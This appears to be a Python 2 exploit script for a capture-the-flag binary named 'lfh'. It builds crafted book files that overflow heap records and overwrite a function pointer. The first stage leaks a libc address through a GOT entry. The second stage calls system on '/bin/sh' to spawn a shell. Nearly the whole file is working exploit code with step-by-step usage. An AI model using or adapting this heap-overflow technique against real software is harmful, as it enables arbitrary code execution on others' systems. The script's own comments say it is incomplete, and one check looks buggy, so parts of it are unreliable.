"""
USAGE:
1. Run: python2 generate_file.py 1
2. Run: ./lfh exploit.book 1 | tee outputfile.txt
3. Press 'y' and 'Ctrl + D'
4. Run in other tab (or tmux split): python2 generate_file.py 2
5. Press 'y' and 'Ctrl + D'
6. You have a shell!

Note: The logic is non-deterministic, so it can fails. If failed - give it another shot.
"""

import sys
import struct

CONTENT = "content: "

g_file_data = ""

def build_header():
	global g_file_data
	# Construct Header (including the magic)
	MAGIC = 0x4b4f4f42
	g_file_data += struct.pack("I", MAGIC)


def add_book(title, abstract, content, is_unicode):
	"""
	#pragma pack(1)
	typedef struct _tagBOOK{
		char title[32];
		char abstract[256];
		void (*fptr)(struct _tagBOOK*);	
		UINT content_len;
		BOOL is_unicode;
		char* content;
		struct _tagBOOK* next;
	}BOOK;
	"""
	global g_file_data
	g_file_data += (title+32 * ' ')[:32]											# title
	g_file_data += (abstract+256* ' ')[:256]										# absract
	g_file_data += 8 * ' '															# fptr
	g_file_data += struct.pack("I", len(content))									# content_len
	g_file_data += struct.pack("I", 1) if is_unicode else struct.pack("I", 0)		# is_unicode
	g_file_data += 8 * ' '															# content ptr
	g_file_data += 8 * ' '															# next
	g_file_data += content															# the actual content

def generate_exploit_first_stage():
	"""
	Control RIP.
	Run lfh with the output file of this script with the parameter 1 (Secure mode).
	This tries to beat randomization so you'll probably need to run it more than once to make it work.
	* This doesn't solve the CTF, but I think this is part of it.
	"""
	global g_file_data
	build_header()

	for i in xrange(12):
		# printf
		# Don't overwrite the next!
		add_book("My book", "This is aaaa's book", "A"*0x144, True)
		g_file_data += 12*'A'															# Fill the end 
		g_file_data += ("flag"+32 * '\x00')[:32]										# title
		g_file_data += 'A' * 256														# absract
		g_file_data += struct.pack("Q", 0x0000000000400FD6)								# fptr - Controlled RIP
		g_file_data += struct.pack("I", 4)												# content_len
		g_file_data += struct.pack("I", 1)												# is_unicode
		g_file_data += struct.pack("Q", 0x0000000000603078)								# content ptr (address of realpath)
	
	with open("exploit.book", "wb") as f:
		f.write(g_file_data)	


def find_realpath_addr():
	with open("outputfile.txt", "rb") as f:
		x = f.read()

	while x:
		content_idx = x.find(CONTENT)
		if x == -1:
			break
		x = x[content_idx+len(CONTENT):]
		if x[0] == 'A' or x[0] == 'f':
			continue

		y=x[:x.find("\n")]
		y += (8-len(y))*"\x00"
		return struct.unpack("Q", y)[0]


def generate_exploit_second_stage():
	"""
	Control RIP.
	Run lfh with the output file of this script with the parameter 1 (Secure mode).
	This tries to beat randomization so you'll probably need to run it more than once to make it work.
	* This doesn't solve the CTF, but I think this is part of it.
	"""
	global g_file_data
	build_header()

	system_function_address = find_realpath_addr() - 0x30
	print hex(system_function_address)

	for i in xrange(12):
		# printf
		# Don't overwrite the next!
		add_book("My book", "This is aaaa's book", "A"*0x144, True)
		g_file_data += 12*'A'															# Fill the end 
		g_file_data += ("/bin/sh"+32 * '\x00')[:32]										# title
		g_file_data += 'A' * 256														# absract
		g_file_data += struct.pack("Q", system_function_address)						# fptr - Controlled RIP
		g_file_data += struct.pack("I", 4)												# content_len
		g_file_data += struct.pack("I", 1)												# is_unicode
		g_file_data += struct.pack("Q", 0x000000000040067C)								# content ptr
	
	with open("exploit_feng_shui.book", "wb") as f:
		f.write(g_file_data)

def main():
	if sys.argv[1] == '1':
		generate_exploit_first_stage()
	else:
		generate_exploit_second_stage()


if __name__ == '__main__':
	main()

